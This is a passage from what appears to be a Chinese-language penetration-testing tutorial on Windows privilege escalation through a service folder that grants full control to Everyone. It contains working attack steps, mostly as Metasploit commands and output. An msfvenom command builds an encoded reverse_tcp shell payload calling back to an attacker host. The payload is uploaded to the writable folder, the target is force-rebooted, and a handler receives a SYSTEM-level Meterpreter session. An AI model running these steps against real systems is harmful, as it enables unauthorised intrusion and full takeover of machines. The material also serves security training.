    meterpreter > shell
    Process 1884 created.
    Channel 4 created.
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.
    C:\Program Files (x86)\Program Folder>icacls "C:\Program Files (x86)\Program Folder"
    icacls "C:\Program Files (x86)\Program Folder"
    C:\Program Files (x86)\Program Folder Everyone:(OI)(CI)(F)
                                          NT SERVICE\TrustedInstaller:(I)(F)
                                          NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                          NT AUTHORITY\SYSTEM:(I)(F)
                                          NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                          BUILTIN\Administrators:(I)(F)
                                          BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                          BUILTIN\Users:(I)(RX)
                                          BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                          CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
    Successfully processed 1 files; Failed processing 0 files
    C:\Program Files (x86)\Program Folder>
G00d Lucky ！ 正如你所看到的，everyone都完全控制这个文件夹。
F =完全控制  
CI =容器继承 - 此标志指示从属容器将继承此ACE。  
OI = Object Inherit - 这个标志表示从属文件将继承ACE。
这意味着我们可以自由地把任何文件放到这个文件夹中！
从现在开始，你要做什么取决于你的想象力。 我只是喜欢生成一个反向shell 的payload作为系统运行。
MSFvenom可以用于这项工作：
    root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe
    No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    No Arch selected, selecting Arch: x86 from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 360 (iteration=0)
    x86/shikata_ga_nai chosen with final size 360
    Payload size: 360 bytes
    Final size of exe file: 73802 bytes
    Saved as: A.exe
上传我们的 payload 到C:\Program Files (x86)\Program Folder 文件夹:
    meterpreter > getuid
    Server username: TARGETMACHINE\testuser
    meterpreter > cd "../../../Program Files (x86)/Program Folder"
    meterpreter > ls
    Listing: C:\Program Files (x86)\Program Folder
    ==============================================
    Mode             Size  Type  Last modified              Name
    ----             ----  ----  -------------              ----    40777/rwxrwxrwx  0     dir   2017-01-04 21:43:28 -0500  A Subfolder
    meterpreter > upload -f A.exe
    [*] uploading  : A.exe -> A.exe
    [*] uploaded   : A.exe -> A.exe
    meterpreter > ls
    Listing: C:\Program Files (x86)\Program Folder
    ==============================================
    Mode              Size   Type  Last modified              Name
    ----              ----   ----  -------------              ----    40777/rwxrwxrwx   0      dir   2017-01-04 21:43:28 -0500  A Subfolder
    100777/rwxrwxrwx  73802  fil   2017-01-04 22:01:32 -0500  A.exe
    meterpreter >
服务器重启后，A.exe将以SYSTEM身份运行。 让我们尝试停止并重新启动服务：
    meterpreter > shell
    Process 1608 created.
    Channel 2 created.
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.
    C:\Users\testuser\Desktop>sc stop "Vulnerable Service"
    sc stop "Vulnerable Service"
    [SC] OpenService FAILED 5:
    Access is denied.
    C:\Users\testuser\Desktop>
访问被拒绝，因为我们没有权限来停止或启动服务。 但是，这并不是什么大事，我们可以等待某个人重新启动机器，或者我们可以使用shutdown命令自行完成：
    C:\Users\testuser\Desktop>shutdown /r /t 0
    shutdown /r /t 0
    C:\Users\testuser\Desktop>
    [*] 192.168.2.40 - Meterpreter session 8 closed. Reason: Died
正如你所看到的，我们的会话已经丢失。 别忘记我们的秘密shell。
我们的目标机器正在重新启动。 不久，我们的payload将作为系统工作。 我们应该立即启动一个处理程序。
    msf > use exploit/multi/handler 
    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf exploit(handler) > set lhost 192.168.2.60 
    lhost => 192.168.2.60
    msf exploit(handler) > set lport 8989
    lport => 8989
    msf exploit(handler) > run
    [*] Started reverse TCP handler on 192.168.2.60:8989 
    [*] Starting the payload handler...
    [*] Sending stage (957999 bytes) to 192.168.2.40
    [*] Meterpreter session 1 opened (192.168.2.60:8989 -> 192.168.2.40:49156) at 2017-01-04 22:37:17 -0500
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    meterpreter > 
    [*] 192.168.2.40 - Meterpreter session 1 closed.  Reason: Died
现在我们已经获得了具有SYSTEM权限的Meterpreter shell。 举手击掌！
但是等一下，为什么我们的会议这么快就死了？ 我们刚刚开始！
不用担心。 这是因为，在Windows操作系统中启动服务时，它必须与服务控制管理器进行通信。 如果不是这样，服务控制管理器认为有问题，并终止该过程。
我们所需要做的是在SCM终止我们的payload之前迁移到另一个进程，或者您可以考虑使用自动迁移。